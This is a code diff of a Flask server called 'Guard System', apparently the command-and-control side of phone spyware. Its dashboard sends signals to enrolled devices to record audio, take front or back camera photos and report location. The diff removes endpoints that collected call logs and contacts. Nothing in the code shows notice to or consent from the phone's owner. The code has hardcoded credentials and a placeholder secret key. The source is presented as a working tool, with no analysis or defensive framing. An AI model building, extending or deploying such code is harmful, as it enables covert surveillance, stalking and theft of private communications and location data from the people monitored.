@@ -11,7 +11,7 @@ app = Flask(__name__)
 app.secret_key = 'your-secret-key-change-in-production-12345'
 app.config['UPLOAD_FOLDER'] = 'recordings'
 app.config['DEVICE_FOLDER'] = 'devices'
-app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit
+app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
 
 # Ensure upload and device directories exist
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
@@ -19,8 +19,6 @@ os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
 
 # Global variables
 device_signals = {}
-
-# Authentication
 USERNAME = "Sukh Hacker"
 PASSWORD = "sukhbir44@007"
 
@@ -237,12 +235,13 @@ def start_device_camera_signal(device_id):
     data = request.get_json()
     camera_type = data.get('camera_type', 'front')
     
-    device_signals[device_id] = {
-        'camera': {
-            'active': True,
-            'camera_type': camera_type,
-            'timestamp': time.time()
-        }
+    if device_id not in device_signals:
+        device_signals[device_id] = {}
+    
+    device_signals[device_id]['camera'] = {
+        'active': True,
+        'camera_type': camera_type,
+        'timestamp': time.time()
     }
     
     print(f"Camera signal activated for device {device_id} - {camera_type} camera")
@@ -436,119 +435,6 @@ def delete_file(filename):
     except Exception as e:
         return jsonify({'ok': False, 'error': str(e)}), 500
 
-# ============ ENHANCED FEATURES ============
-
-@app.route('/device/<device_id>/upload-call-logs', methods=['POST'])
-def upload_call_logs(device_id):
-    try:
-        data = request.get_json()
-        call_logs = data.get('call_logs', [])
-        
-        timestamp = str(int(time.time()))
-        filename = f"{device_id}_call_logs_{timestamp}.json"
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        
-        with open(filepath, 'w') as f:
-            json.dump(call_logs, f, indent=2)
-        
-        print(f"✅ Call logs uploaded for device {device_id}: {len(call_logs)} records")
-        return jsonify({'ok': True, 'message': 'Call logs received'})
-        
-    except Exception as e:
-        print(f"❌ Call logs upload error: {e}")
-        return jsonify({'ok': False, 'error': 'Call logs upload failed'}), 500
-
-@app.route('/device/<device_id>/upload-contacts', methods=['POST'])
-def upload_contacts(device_id):
-    try:
-        data = request.get_json()
-        contacts = data.get('contacts', [])
-        
-        timestamp = str(int(time.time()))
-        filename = f"{device_id}_contacts_{timestamp}.json"
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        
-        with open(filepath, 'w') as f:
-            json.dump(contacts, f, indent=2)
-        
-        print(f"✅ Contacts uploaded for device {device_id}: {len(contacts)} contacts")
-        return jsonify({'ok': True, 'message': 'Contacts received'})
-        
-    except Exception as e:
-        print(f"❌ Contacts upload error: {e}")
-        return jsonify({'ok': False, 'error': 'Contacts upload failed'}), 500
-
-# Enhanced feature signals
-@app.route('/device/<device_id>/start-call-logs-collection', methods=['POST'])
-def start_call_logs_collection(device_id):
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    if device_id not in device_signals:
-        device_signals[device_id] = {}
-    
-    device_signals[device_id]['call_logs'] = {
-        'active': True,
-        'timestamp': time.time()
-    }
-    
-    print(f"Call logs collection activated for device {device_id}")
-    return jsonify({'ok': True, 'message': f'Call logs collection signal sent to {device_id}'})
-
-@app.route('/device/<device_id>/start-contacts-collection', methods=['POST'])
-def start_contacts_collection(device_id):
-    if not session.get('logged_in'):
-        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
-    
-    if device_id not in device_signals:
-        device_signals[device_id] = {}
-    
-    device_signals[device_id]['contacts'] = {
-        'active': True,
-        'timestamp': time.time()
-    }
-    
-    print(f"Contacts collection activated for device {device_id}")
-    return jsonify({'ok': True, 'message': f'Contacts collection signal sent to {device_id}'})
-
-@app.route('/device/<device_id>/check-call-logs-signal')
-def check_call_logs_signal(device_id):
-    call_logs_signal = device_signals.get(device_id, {}).get('call_logs', {})
-    
-    if call_logs_signal and call_logs_signal.get('active'):
-        if time.time() - call_logs_signal.get('timestamp', 0) < 30:
-            return jsonify({'collect_call_logs': True})
-    
-    if device_id in device_signals:
-        device_signals[device_id]['call_logs'] = {'active': False}
-    
-    return jsonify({'collect_call_logs': False})
-
-@app.route('/device/<device_id>/check-contacts-signal')
-def check_contacts_signal(device_id):
-    contacts_signal = device_signals.get(device_id, {}).get('contacts', {})
-    
-    if contacts_signal and contacts_signal.get('active'):
-        if time.time() - contacts_signal.get('timestamp', 0) < 30:
-            return jsonify({'collect_contacts': True})
-    
-    if device_id in device_signals:
-        device_signals[device_id]['contacts'] = {'active': False}
-    
-    return jsonify({'collect_contacts': False})
-
-@app.route('/device/<device_id>/call-logs-received', methods=['POST'])
-def call_logs_received(device_id):
-    if device_id in device_signals:
-        device_signals[device_id]['call_logs'] = {'active': False}
-    return jsonify({'ok': True})
-
-@app.route('/device/<device_id>/contacts-received', methods=['POST'])
-def contacts_received(device_id):
-    if device_id in device_signals:
-        device_signals[device_id]['contacts'] = {'active': False}
-    return jsonify({'ok': True})
-
 # ============ TEMPLATES ============
 
 LOGIN_HTML = """
@@ -598,9 +484,6 @@ LOGIN_HTML = """
 </body>
 </html>
 """
-
-# Add your DEVICES_HTML and DEVICE_DASHBOARD_HTML templates here
-# (Use the templates from previous response)
 
 DEVICES_HTML = """
 <!doctype html>
@@ -710,8 +593,661 @@ DEVICES_HTML = """
 </html>
 """
 
-# Add DEVICE_DASHBOARD_HTML template from previous response
-# (Copy the complete DEVICE_DASHBOARD_HTML from earlier)
+DEVICE_DASHBOARD_HTML = """
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Guard System - {{ device.name }}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 25px 30px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header-left h1 {
+            color: #00b7ff;
+            font-size: 2.2rem;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            margin-bottom: 5px;
+        }
+        
+        .header-left p {
+            color: #888;
+            font-size: 1rem;
+        }
+        
+        .device-info {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        
+        .header-right {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        
+        /* Button Styles */
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-logout {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: white;
+        }
+        
+        .btn-back {
+            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            color: white;
+        }
+        
+        .btn-recorder {
+            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+        }
+        
+        /* Control Sections */
+        .control-section {
+            background: rgba(25, 25, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .section-title {
+            color: #00b7ff;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 2px solid rgba(0, 183, 255, 0.3);
+            padding-bottom: 12px;
+        }
+        
+        /* Control Groups */
+        .control-group {
+            margin-bottom: 20px;
+        }
+        
+        .control-group label {
+            display: block;
+            color: #00b7ff;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .control-group input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            padding: 12px 15px;
+            font-size: 1rem;
+            width: 120px;
+            transition: all 0.3s ease;
+        }
+        
+        .control-group input:focus {
+            outline: none;
+            border-color: #00b7ff;
+            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
+        }
+        
+        /* Control Buttons */
+        .controls {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .btn-control {
+            padding: 14px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-start {
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            color: white;
+        }
+        
+        .btn-stop {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            color: white;
+        }
+        
+        .btn-camera-front {
+            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
+            color: white;
+        }
+        
+        .btn-camera-back {
+            background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
+            color: white;
+        }
+        
+        .btn-location {
+            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
+            color: white;
+        }
+        
+        /* Status Indicators */
+        .signal-status {
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .status-active {
+            background: rgba(40, 167, 69, 0.2);
+            color: #28a745;
+            border: 1px solid rgba(40, 167, 69, 0.5);
+        }
+        
+        .status-inactive {
+            background: rgba(108, 117, 125, 0.2);
+            color: #6c757d;
+            border: 1px solid rgba(108, 117, 125, 0.5);
+        }
+        
+        /* File Lists */
+        .files-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .file-card {
+            background: rgba(40, 40, 40, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .file-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
+            border-color: #00b7ff;
+        }
+        
+        .file-name {
+            color: #00b7ff;
+            font-weight: 600;
+            margin-bottom: 8px;
+            word-break: break-all;
+        }
+        
+        .file-info {
+            display: flex;
+            justify-content: space-between;
+            color: #888;
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-file {
+            flex: 1;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+        }
+        
+        .btn-download {
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+        }
+        
+        .btn-delete {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+        
+        /* Photos Grid */
+        .photos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .photo-card {
+            background: rgba(40, 40, 40, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .photo-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
+            border-color: #00b7ff;
+        }
+        
+        .photo-img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            background: #1a1a1a;
+        }
+        
+        .photo-info {
+            padding: 12px;
+        }
+        
+        .photo-name {
+            color: #00b7ff;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+        
+        .photo-size {
+            color: #888;
+            font-size: 0.75rem;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
+        }
+        
+        .empty-state h4 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #888;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .btn-control {
+                justify-content: center;
+            }
+            
+            .files-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <div class="header-left">
+                <h1>🎮 {{ device.name }}</h1>
+                <p>Device Control Panel</p>
+                <div class="device-info">
+                    Model: {{ device.model }} | ID: {{ device_id }}
+                </div>
+            </div>
+            <div class="header-right">
+                <a href="/devices" class="btn btn-back">⬅️ Back to Devices</a>
+                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
+            </div>
+        </header>
+
+        <!-- Recording Controls -->
+        <div class="control-section">
+            <div class="section-title">🎤 Audio Recording Controls</div>
+            
+            <div class="control-group">
+                <label for="recordTime">Recording Duration (seconds):</label>
+                <input type="number" id="recordTime" value="15" min="5" max="300">
+            </div>
+            
+            <div class="controls">
+                <button class="btn-control btn-start" onclick="startRecording()">
+                    🎤 Start Recording
+                </button>
+                <button class="btn-control btn-stop" onclick="stopRecording()">
+                    ⏹️ Stop Recording
+                </button>
+                <div class="signal-status status-inactive" id="recordingStatus">
+                    🔴 Recording: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Camera Controls -->
+        <div class="control-section">
+            <div class="section-title">📸 Camera Controls</div>
+            
+            <div class="controls">
+                <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
+                    📱 Front Camera
+                </button>
+                <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
+                    📷 Back Camera
+                </button>
+                <div class="signal-status status-inactive" id="cameraStatus">
+                    🔴 Camera: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Location Controls -->
+        <div class="control-section">
+            <div class="section-title">📍 Location Controls</div>
+            
+            <div class="controls">
+                <button class="btn-control btn-location" onclick="getLocation()">
+                    📍 Get Location
+                </button>
+                <div class="signal-status status-inactive" id="locationStatus">
+                    🔴 Location: Inactive
+                </div>
+            </div>
+        </div>
+
+        <!-- Recordings List -->
+        <div class="control-section">
+            <div class="section-title">🎵 Recent Recordings</div>
+            
+            {% if files %}
+            <div class="files-grid">
+                {% for file in files %}
+                <div class="file-card">
+                    <div class="file-name">{{ file.name }}</div>
+                    <div class="file-info">
+                        <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
+                        <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
+                    </div>
+                    <div class="file-actions">
+                        <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
+                        <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>📭 No Recordings Found</h4>
+                <p>Start recording to see files here</p>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Photos List -->
+        <div class="control-section">
+            <div class="section-title">🖼️ Recent Photos</div>
+            
+            {% if photos %}
+            <div class="photos-grid">
+                {% for photo in photos %}
+                <div class="photo-card">
+                    <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
+                    <div class="photo-info">
+                        <div class="photo-name">{{ photo.name }}</div>
+                        <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>📷 No Photos Found</h4>
+                <p>Capture photos using camera controls</p>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Location Files -->
+        <div class="control-section">
+            <div class="section-title">🗺️ Location History</div>
+            
+            {% if location_files %}
+            <div class="files-grid">
+                {% for location in location_files %}
+                <div class="file-card">
+                    <div class="file-name">{{ location.name }}</div>
+                    <div class="file-info">
+                        <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
+                        <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
+                    </div>
+                    <div class="file-actions">
+                        <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
+                        <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% else %}
+            <div class="empty-state">
+                <h4>🗺️ No Location Data</h4>
+                <p>Get location data using location controls</p>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        const deviceId = "{{ device_id }}";
+        
+        // Recording functions
+        async function startRecording() {
+            const recordTime = document.getElementById('recordTime').value || 15;
+            
+            try {
+                const response = await fetch(`/device/${deviceId}/start-recording`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ record_time: parseInt(recordTime) })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('recordingStatus', '🟢 Recording: Active', 'status-active');
+                    showNotification('Recording signal sent to device', 'success');
+                } else {
+                    showNotification('Failed to send recording signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send recording signal', 'error');
+            }
+        }
+        
+        function stopRecording() {
+            // For now, stopping is handled automatically after the recording duration
+            updateStatus('recordingStatus', '🔴 Recording: Inactive', 'status-inactive');
+            showNotification('Recording will stop automatically after duration', 'info');
+        }
+        
+        // Camera functions
+        async function captureCamera(cameraType) {
+            try {
+                const response = await fetch(`/device/${deviceId}/start-camera-signal`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ camera_type: cameraType })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('cameraStatus', `🟢 Camera: ${cameraType} Active`, 'status-active');
+                    showNotification(`${cameraType} camera signal sent to device`, 'success');
+                    
+                    // Reset status after 5 seconds
+                    setTimeout(() => {
+                        updateStatus('cameraStatus', '🔴 Camera: Inactive', 'status-inactive');
+                    }, 5000);
+                } else {
+                    showNotification('Failed to send camera signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send camera signal', 'error');
+            }
+        }
+        
+        // Location functions
+        async function getLocation() {
+            try {
+                const response = await fetch(`/device/${deviceId}/start-location-signal`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateStatus('locationStatus', '🟢 Location: Active', 'status-active');
+                    showNotification('Location signal sent to device', 'success');
+                    
+                    // Reset status after 5 seconds
+                    setTimeout(() => {
+                        updateStatus('locationStatus', '🔴 Location: Inactive', 'status-inactive');
+                    }, 5000);
+                } else {
+                    showNotification('Failed to send location signal: ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Failed to send location signal', 'error');
+            }
+        }
+        
+        // Utility functions
+        function updateStatus(elementId, text, className) {
+            const element = document.getElementById(elementId);
+            element.textContent = text;
+            element.className = `signal-status ${className}`;
+        }
+        
+        function showNotification(message, type) {
+            // Simple notification - you can enhance this with a proper notification system
+            alert(`${type.toUpperCase()}: ${message}`);
+        }
+        
+        async function deleteFile(filename) {
+            if (confirm('Are you sure you want to delete this file?')) {
+                try {
+                    const response = await fetch(`/delete-file/${filename}`, {
+                        method: 'POST'
+                    });
+                    
+                    if (response.ok) {
+                        showNotification('File deleted successfully', 'success');
+                        location.reload();
+                    } else {
+                        showNotification('Failed to delete file', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    showNotification('Failed to delete file', 'error');
+                }
+            }
+        }
+        
+        // Auto-refresh photos and location data every 10 seconds
+        setInterval(() => {
+            // You can implement auto-refresh for specific sections here
+        }, 10000);
+    </script>
+</body>
+</html>
+"""
 
 if __name__ == '__main__':
     print("🚀 Starting Guard System Server...")
